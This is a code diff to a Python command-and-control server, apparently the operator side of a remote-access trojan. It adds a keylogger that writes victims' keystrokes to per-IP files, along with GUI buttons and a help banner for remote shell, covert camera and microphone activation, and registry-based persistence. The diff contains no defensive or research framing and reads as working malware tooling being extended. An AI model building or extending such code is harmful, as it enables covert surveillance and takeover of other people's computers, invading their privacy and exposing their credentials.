@@ -30,6 +30,39 @@ class Command_Center():
         self.entry_status = False
         self.current_client_index = None
         self.buttons_clients = []
+        self.status_keylogger = False
+        self.HELP = '''
+        Help banner - Commands
+
+        help -> to show this banner
+
+        info -> to view server information
+
+        vars -> to view variables of the server
+
+        list -> list connected clients and their indexes
+
+        del (INDEXCLIENT)-> remove a client
+        
+        set (IP | PORT) (VALUE)-> modify your IP and PORT
+
+
+        send  (INDEXCLIENT) (COMMAND) -> to send a remote command to a client :
+            Possible commands
+                info      -> show information of a Client
+                autocon   -> if the server is stopped the client will try to connect again and again
+                keylogger -> create a file with the ip address of the client and log the keys pressed by the client.
+                camera    -> activate a camera if available (q to exit not Q)
+                mic       -> activate a microphone if available (q to exit not Q)
+                persist   -> modify the registers in the startup for start the client
+                shell     -> get a shell in the system
+
+        stop -> stop the server
+        
+        start -> start the server
+
+        cls | clear -> clear the display
+        '''
     def start_server(self):
         if not self.check_addr():
             self.PrintSmart('\n[-] Check your Ip and Port')
@@ -70,7 +103,7 @@ class Command_Center():
         if self.MODE == 'graphic':
             button = tk.Button(self.button_frame, text=f'{client_address}', command=lambda: self.GetClientIndexGUI(client_address))
             self.buttons_clients.append(button)
-        button.pack(fill=tk.X)
+            button.pack(fill=tk.X)
         self.PrintSmart(f'\n[+] New connection from {client_address}')
         self.Clients.append(writer)
 
@@ -86,6 +119,9 @@ class Command_Center():
                 elif data.decode(errors='ignore') == 'shell':
                     self.status_shell = False
                     continue
+                elif data.decode(errors='ignore') == 'keylogger':
+                    self.status_keylogger = False
+                    continue
                 
                 
                 if self.status_shell == True:
@@ -96,8 +132,8 @@ class Command_Center():
                         try:
                             size_data = await asyncio.wait_for(reader.readexactly(4),2)
                             if not size_data is None and size_data.decode(errors='ignore') == 'exit':
-                                self.PrintSmart('\n[-] no cameras available')
                                 self.status_camera = False
+                                self.PrintSmart('\n[-] no cameras available')
                                 break
                             size = int.from_bytes(size_data, 'big')
                             data = await asyncio.wait_for(reader.readexactly(size),2)
@@ -116,16 +152,22 @@ class Command_Center():
                 elif self.status_mic == True:
                     self.buffer_mic = data
                     continue
-                    
-            
+                elif self.status_keylogger == True:
+                    with open(f'{client_address}_logger.txt','a') as f:
+                        f.write(data.decode(errors='ignore'))
+                        f.close()
+                    continue                    
                 msg = data.decode(errors='ignore')
                 self.PrintSmart(f'\n[+] Received from {client_address} : {msg}')
+                if self.status_keylogger == True:
+                    self.status_keylogger = False
             except (ConnectionResetError, BrokenPipeError,OSError):
+                if self.status_keylogger == True:
+                    self.status_keylogger = False
                 self.PrintSmart(f'\n[-] Client disconnected: {client_address}')
                 break
         self.Clients.remove(writer)
         writer.close()
-        await writer.wait_closed()
         if self.MODE == 'graphic':
             button.destroy()
             
@@ -139,14 +181,33 @@ class Command_Center():
                     if self.status == True:
                         await self.CloseServer()
                     break
-
-            if command.startswith('send'):
+            if command == 'help':
+                self.PrintSmart(self.HELP)
+            elif command.startswith('send'):
                 if self.status == True:
                     if  len(command.split()) == 3:
                         _, index ,msg= command.split()
                         try:
                             index = int(index)
 
+                            if msg == 'keylogger' and  self.status_keylogger == False:
+                                self.status_keylogger = True
+                                self.Clients[index].write(bytes(msg,'utf-8'))
+                                await  self.Clients[index].drain()
+                                address = self.Clients[index].get_extra_info('peername')
+                                with open(f'{address}_logger.txt','w') as f:
+                                    f.close()
+                                if self.MODE == 'graphic':
+                                    self.entry_status = False
+                                    return
+                            elif msg == 'keylogger' and  self.status_keylogger == True:
+                                self.PrintSmart('[-] Keylogger is running in a Client')
+                                if self.MODE == 'graphic':
+                                    self.entry_status = False
+                                    return
+                            elif self.status_keylogger == True and msg != 'exit':
+                                self.PrintSmart('[-] Keylogger is running in a Client')
+                                continue
                             if msg == 'shell':
                                 self.status_shell = True
                                 if self.MODE == 'graphic':
@@ -171,14 +232,15 @@ class Command_Center():
                             elif msg == 'mic':
                                 self.status_mic = True
                                 self.Clients[index].write(bytes('mic','utf-8'))
+                                await self.Clients[index].drain()
                                 await self.GetMic(index)
                                 if self.MODE == 'graphic':
                                     self.entry_status = False
                                     return
                                 continue
-
-                            self.Clients[index].write(bytes(msg,'utf-8'))
-                            await  self.Clients[index].drain()
+                            else:
+                                self.Clients[index].write(bytes(msg,'utf-8'))
+                                await  self.Clients[index].drain()
                         except IndexError:
                             self.PrintSmart('[-] Unknown Client Index\n')
                         except ValueError:
@@ -230,6 +292,10 @@ class Command_Center():
                 self.PrintSmart(f'SHELL={self.status_shell}')
                 self.PrintSmart(f'CAMERA={self.status_camera}')
                 self.PrintSmart(f'MIC={self.status_mic}')
+                self.PrintSmart(f'KEYLOGGER={self.status_keylogger}')
+                self.PrintSmart(f'CURRENT CLIENT INDEX={self.current_client_index}')
+                self.PrintSmart(f'LINES_GUI={self.lines_gui}')
+                self.PrintSmart(f'ENTRY_STATUS={self.entry_status}')
             elif command == 'info':
                 self.PrintSmart(f'IP : {self.IP} , PORT : {self.PORT} , RUNNING : {self.status}')
             elif command == 'list':
@@ -276,8 +342,13 @@ class Command_Center():
 
     def input_command_gui(self,event):
         async def send_command_shell():
-            self.Clients[self.current_client_index].write(bytes(self.command_gui,'utf-8'))
-            await  self.Clients[self.current_client_index].drain()
+            try:
+                self.Clients[self.current_client_index].write(bytes(self.command_gui,'utf-8'))
+                await  self.Clients[self.current_client_index].drain()
+            except IndexError:
+                self.entry_status = False
+                self.status_shell = False
+                return
         self.command_gui = self.input_command.get()
 
         if self.status_shell == False:
@@ -306,17 +377,33 @@ class Command_Center():
             self.current_client_index = None
         if self.current_client_index is None:
             self.console_frame.set('console')
-            self.PrintSmart('[-] there are no Clients')
+            self.PrintSmart('[-] there are no Client Selected')
             return
-        if opt == 'shell' and self.status_shell == False:
+        if opt == 'shell' and self.status_shell == False and self.status_keylogger == False:
             self.PrintSmart('[+] Wait for the shell ...')
             self.console_frame.set('console')
             self.entry_status = True
-        elif opt == 'autocon':
+        elif opt == 'keylogger' and self.status_keylogger == False and self.status_shell == False:
             self.console_frame.set('console')
+            self.PrintSmart('[+] keylogger activated')
+            self.PrintSmart('send (INDEXCLIENT) exit - to stop keylogger')
+        elif opt == 'keylogger' and self.status_keylogger == True and self.status_shell == False:
+            self.console_frame.set('console')
+            self.PrintSmart('[-] keylogger is running')
+            return
+        elif (opt == 'autocon' or opt == 'info' or opt == 'persist') and self.status_keylogger == False and self.status_shell == False:
+            self.console_frame.set('console')
+        elif opt == 'del' and self.status_keylogger == False and self.status_shell == False:
+            self.console_frame.set('console')
+            asyncio.run(self.terminal_interface(f'del {self.current_client_index}'))
+            return
         elif self.status_shell == True:
             self.console_frame.set('console')
             self.PrintSmart('[-] Shell is activated')
+            return
+        elif self.status_keylogger == True:
+            self.console_frame.set('console')
+            self.PrintSmart('[-] Keylogger is running in a client')
             return
         asyncio.run(self.terminal_interface(f'send {self.current_client_index} ' + opt))
     def Graphic_Interface(self):
@@ -393,6 +480,27 @@ class Command_Center():
             text='AUTOCON',
             command=lambda:self.ButtonsCurrentClient('autocon')
         )
+        self.Button_KEYLOGGER = customtkinter.CTkButton(
+            self.console_frame.tab('current client'),
+            text='KEYLOGGER',
+            command=lambda:self.ButtonsCurrentClient('keylogger')
+        )
+        self.Button_INFO = customtkinter.CTkButton(
+            self.console_frame.tab('current client'),
+            text='INFO',
+            command=lambda:self.ButtonsCurrentClient('info')
+        )
+        self.Button_DEL = customtkinter.CTkButton(
+            self.console_frame.tab('current client'),
+            text='DELETE',
+            command=lambda:self.ButtonsCurrentClient('del')
+        )
+        self.Button_PERSIST = customtkinter.CTkButton(
+            self.console_frame.tab('current client'),
+            text='PERSIST',
+            command=lambda:self.ButtonsCurrentClient('persist')
+        )
+        
         #config buttons
         self.input_command.bind(
             '<Return>',
@@ -411,6 +519,10 @@ class Command_Center():
         self.Button_Camera.place(x=300,y=20)
         self.Button_Shell.place(x=20,y=90)
         self.Button_AUTOCON.place(x=300,y=90)
+        self.Button_KEYLOGGER.place(x=20,y=170)
+        self.Button_INFO.place(x=300,y=170)
+        self.Button_DEL.place(x=20,y=250)
+        self.Button_PERSIST.place(x=300,y=250)
         #start GUI
         self.app.mainloop()
             
@@ -447,14 +559,26 @@ class Command_Center():
                     await self.Clients[index].drain()
                     cv2.destroyAllWindows()
                     if self.MODE == 'graphic':
-                        self.app.attributes("-disabled", False)    
+                        self.app.attributes("-disabled", False)
+                        self.console_frame.set('console')    
                     break
+            if self.MODE == 'graphic':
+                self.app.attributes("-disabled", False)
+                self.console_frame.set('console')    
         except KeyboardInterrupt:
             self.status_shell = False
             self.Clients[index].write(b'exit')
             await self.Clients[index].drain()
             cv2.destroyAllWindows()
-            return   
+            return
+        except:
+            self.status_camera = False
+            cv2.destroyAllWindows()
+            if self.MODE == 'graphic':
+                self.app.attributes("-disabled", False)
+                self.console_frame.set('console') 
+            return
+
     async def GetShell(self,index):
         while self.status_shell:
             await asyncio.sleep(2)
@@ -522,11 +646,21 @@ class Command_Center():
                     if self.MODE == 'graphic':
                         self.app.attributes("-disabled", False)    
                     break
+            if self.MODE == 'graphic':
+                self.app.attributes("-disabled", False)
+                self.console_frame.set('console')
         except KeyboardInterrupt:
             stream.stop_stream()
             self.Clients[index].write(b'exit')
             await self.Clients[index].drain()
             self.status_mic = False
+        except:
+            self.status_camera = False
+            cv2.destroyAllWindows()
+            if self.MODE == 'graphic':
+                self.app.attributes("-disabled", False)
+                self.console_frame.set('console') 
+            return
 
     def PrintSmart(self,txt):
         if self.MODE == 'terminal':
